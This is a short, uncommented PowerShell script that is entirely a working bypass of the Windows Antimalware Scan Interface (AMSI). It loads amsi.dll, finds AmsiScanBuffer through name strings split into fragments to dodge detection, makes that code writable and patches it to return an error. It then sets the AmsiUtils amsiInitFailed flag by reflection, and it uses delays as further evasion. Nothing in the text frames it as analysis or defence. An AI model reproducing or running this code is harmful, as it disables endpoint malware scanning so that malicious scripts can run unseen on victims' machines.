$w = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $w
$var1 = "a" + "msi" + ".dll"

$LoadLibrary1 = [Win32]::LoadLibrary($var1)
start-sleep -Seconds 1
$Address1 = [Win32]::GetProcAddress($LoadLibrary1, "A" + "m" + "si" + "S" + "can" + "B" + "u" + "ffer")
start-sleep -Seconds 1
$p1 = 0
start-sleep -Seconds 1
[Win32]::VirtualProtect($Address1, [uint32]5, 0x40, [ref]$p1)
start-sleep -Seconds 1
$Patch1 = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
start-sleep -Seconds 1
[System.Runtime.InteropServices.Marshal]::Copy($Patch1, 0, $Address1, 6)

[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)
